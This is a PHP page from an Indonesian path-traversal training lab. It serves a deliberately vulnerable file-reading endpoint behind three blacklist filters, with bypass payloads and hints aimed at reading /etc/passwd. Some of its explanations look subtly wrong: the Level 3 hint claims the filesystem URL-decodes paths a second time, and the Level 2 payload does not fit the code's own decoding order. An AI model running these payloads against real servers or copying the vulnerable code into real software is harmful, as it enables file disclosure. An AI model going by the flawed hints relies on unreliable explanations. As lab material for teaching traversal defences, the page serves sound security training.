<?php
$active = 'advanced-1';
$page   = $_GET['page'] ?? '';
$level  = max(1, min(3, (int)($_GET['level'] ?? 1)));
$output = ''; $error = ''; $resolved = ''; $filtered = '';

function applyFilter($input, $level) {
    $s = $input;
    if ($level >= 1) {
        // Level 1: hapus ../ secara sederhana (sekali)
        $s = str_replace('../', '', $s);
    }
    if ($level >= 2) {
        // Level 2: hapus ../ berulang (loop)
        while (str_contains($s, '../')) {
            $s = str_replace('../', '', $s);
        }
        $s = str_replace('..\\', '', $s);
    }
    if ($level >= 3) {
        // Level 3: hapus ../ dan encode
        while (str_contains($s, '../') || str_contains($s, '..%2f') || str_contains($s, '%2e%2e')) {
            $s = str_replace(['../', '..%2f', '%2e%2e/', '%2e%2e%2f'], '', $s);
        }
    }
    return $s;
}

if ($page !== '') {
    $filtered = applyFilter(urldecode($page), $level);
    $resolved = $filtered;

    if (file_exists($resolved)) {
        $output = file_get_contents($resolved);
    } else {
        $error = "File tidak ditemukan: " . htmlspecialchars($resolved, ENT_QUOTES, 'UTF-8');
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced 1: Filter Bypass LFI — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Advanced 1: LFI + Filter Bypass</span></div>
    <h1>LFI + Filter Bypass <span class="tag o">ADVANCED 1</span></h1>
    <p class="phdr-desc">Server memfilter sequence <code class="ic">../</code> dengan tiga pendekatan berbeda. Pelajari teknik encoding dan nested payload untuk melewati setiap filter.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Bypass Level 1: filter <code class="ic">str_replace('../', '')</code> yang hanya berjalan sekali</span></li>
      <li><div class="obj-n">2</div><span>Bypass Level 2: filter yang berjalan dalam loop hingga tidak ada <code class="ic">../</code> tersisa</span></li>
      <li><div class="obj-n">3</div><span>Bypass Level 3: filter yang juga menangani URL encoding <code class="ic">%2e%2e%2f</code></span></li>
      <li><div class="obj-n">4</div><span>Baca <code class="ic">/etc/passwd</code> di setiap level menggunakan teknik bypass yang berbeda</span></li>
    </ul>
  </div>

  <!-- Level Selector -->
  <div class="box">
    <div class="box-t">Filter Level</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px">
      <?php
      $lvls = [
        1 => ['label'=>'Level 1 — str_replace sekali','color'=>'g'],
        2 => ['label'=>'Level 2 — str_replace loop', 'color'=>'o'],
        3 => ['label'=>'Level 3 — + URL encode filter','color'=>'r'],
      ];
      foreach ($lvls as $n => $l):
        $on = $level==$n;
      ?>
      <a href="/advanced-1/?level=<?= $n ?><?= $page?'&page='.urlencode($page):'' ?>"
         style="padding:8px 16px;border-radius:var(--r);font-size:.8rem;font-weight:600;border:1px solid;text-decoration:none;transition:all .15s;<?= $on?'background:var(--rbg);border-color:var(--rbdr);color:var(--red)':'background:var(--el);border-color:var(--bd);color:var(--t2)' ?>">
        <?= $l['label'] ?>
      </a>
      <?php endforeach; ?>
    </div>

    <div class="qbox" style="margin-bottom:0"><div class="ql">Filter Code — Level <?= $level ?></div><?php if($level==1): ?><span class="val">$s</span> = <span class="at">str_replace</span>(<span class="str">'../'</span>, <span class="str">''</span>, <span class="val">$input</span>); <span class="cm">// hanya sekali</span><?php elseif($level==2): ?><span class="kw">while</span> (<span class="at">str_contains</span>(<span class="val">$s</span>, <span class="str">'../'</span>)) {
    <span class="val">$s</span> = <span class="at">str_replace</span>(<span class="str">'../'</span>, <span class="str">''</span>, <span class="val">$s</span>); <span class="cm">// loop</span>
}<?php else: ?><span class="kw">while</span> (<span class="at">str_contains</span>(<span class="val">$s</span>, <span class="str">'../'</span>) || <span class="at">str_contains</span>(<span class="val">$s</span>, <span class="str">'%2e%2e'</span>)) {
    <span class="val">$s</span> = <span class="at">str_replace</span>([<span class="str">'../'</span>, <span class="str">'..%2f'</span>, <span class="str">'%2e%2e/'</span>], <span class="str">''</span>, <span class="val">$s</span>);
}<?php endif; ?></div>
  </div>

  <div class="box">
    <div class="box-t">Path Input</div>
    <div class="frow" style="align-items:flex-end">
      <div class="fg" style="flex:1;margin-bottom:0">
        <label class="fl">Parameter ?page=</label>
        <input class="fi" type="text" id="page-input"
          value="<?= htmlspecialchars($page, ENT_QUOTES, 'UTF-8') ?>"
          placeholder="Masukkan path dengan teknik bypass...">
      </div>
      <button class="btn btn-r" onclick="goToPage()">Test</button>
      <?php if($page): ?><a href="/advanced-1/?level=<?= $level ?>" class="btn btn-g">Reset</a><?php endif; ?>
    </div>
  </div>

  <?php if ($page !== ''): ?>
  <div class="box">
    <div class="box-t">Filter Trace</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div>
        <div style="font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono);margin-bottom:6px">Input (decoded)</div>
        <div class="qbox" style="margin-bottom:0;color:var(--red)"><?= htmlspecialchars(urldecode($page), ENT_QUOTES, 'UTF-8') ?></div>
      </div>
      <div>
        <div style="font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono);margin-bottom:6px">Setelah Filter L<?= $level ?></div>
        <div class="qbox" style="margin-bottom:0;color:var(--green)"><?= htmlspecialchars($filtered, ENT_QUOTES, 'UTF-8') ?></div>
      </div>
    </div>
  </div>

  <?php if ($error): ?>
    <div class="alert a-err"><?= $error ?></div>
  <?php elseif ($output !== ''): ?>
    <div class="box">
      <div class="box-t">File Output &mdash; <?= strlen($output) ?> bytes</div>
      <div class="file-out"><?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?></div>
    </div>
    <?php if (str_contains($output, 'FLAG{') || str_contains($output, 'root:')): ?>
    <div class="alert a-ok"><strong>Bypass berhasil!</strong> File berhasil dibaca meskipun filter aktif.</div>
    <?php endif; ?>
  <?php endif; ?>
  <?php endif; ?>

  <div class="box">
    <div class="box-t">Bypass Technique Reference</div>
    <div class="qbox"><div class="ql">Teknik per level</div><span class="cm">-- Level 1: str_replace('../') hanya sekali -- sisipkan ../ di dalam ../</span>
<span class="str">....//etc/passwd</span>        <span class="cm">-> setelah replace '../' -> ../etc/passwd</span>
<span class="str">..././etc/passwd</span>         <span class="cm">-> setelah replace '../' -> ../etc/passwd</span>

<span class="cm">-- Level 2: loop replacement -- gunakan encoding yang tidak di-replace</span>
<span class="str">..%2fetc%2fpasswd</span>        <span class="cm">-> %2f = / dalam URL encoding</span>
<span class="str">%2e%2e/etc/passwd</span>        <span class="cm">-> %2e = . dalam URL encoding</span>

<span class="cm">-- Level 3: encoding juga di-filter -- double encode atau path variation</span>
<span class="str">%252e%252e%252fetc%252fpasswd</span>  <span class="cm">-> double-encoded (% -> %25)</span></div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; Bypass Level 1</summary>
      <div class="hint-body"><code class="ic">str_replace('../', '')</code> berjalan sekali. Sisipkan <code class="ic">../</code> di tengah sequence sehingga setelah dihapus hasilnya tetap <code class="ic">../</code>:<br><code class="ic">....//etc/passwd</code> &rarr; setelah hapus <code class="ic">../</code> &rarr; <code class="ic">../etc/passwd</code></div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; Bypass Level 2</summary>
      <div class="hint-body">Loop replacement tidak bisa ditembus dengan nested payload. Gunakan URL encoding untuk karakter <code class="ic">/</code> menjadi <code class="ic">%2f</code>:<br><code class="ic">..%2fetc%2fpasswd</code><br>Filter hanya menghapus literal <code class="ic">../</code> bukan <code class="ic">..%2f</code>.</div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; Bypass Level 3</summary>
      <div class="hint-body">Filter Level 3 juga menangani <code class="ic">%2f</code> dan <code class="ic">%2e</code>. Gunakan double encoding — encode karakter <code class="ic">%</code> menjadi <code class="ic">%25</code>:<br><code class="ic">%252e%252e%252fetc%252fpasswd</code><br>Server men-decode sekali: <code class="ic">%25</code> &rarr; <code class="ic">%</code>, menghasilkan <code class="ic">%2e%2e%2f</code> yang kemudian di-decode lagi oleh filesystem.</div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; Kesimpulan</summary>
      <div class="hint-body">Blacklist-based filter untuk path traversal hampir selalu bisa di-bypass karena banyaknya cara mengekspresikan <code class="ic">../</code>. Solusi yang benar adalah <code class="ic">realpath()</code> + whitelist directory check, bukan str_replace.</div>
    </details>
  </div>

</div>

<script>
function goToPage() {
    var v = document.getElementById('page-input').value;
    if (v) window.location.href = '/advanced-1/?level=<?= $level ?>&page=' + encodeURIComponent(v);
}
document.getElementById('page-input').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') goToPage();
});
</script>

<?php include '../includes/footer.php'; ?>
</body>
</html>
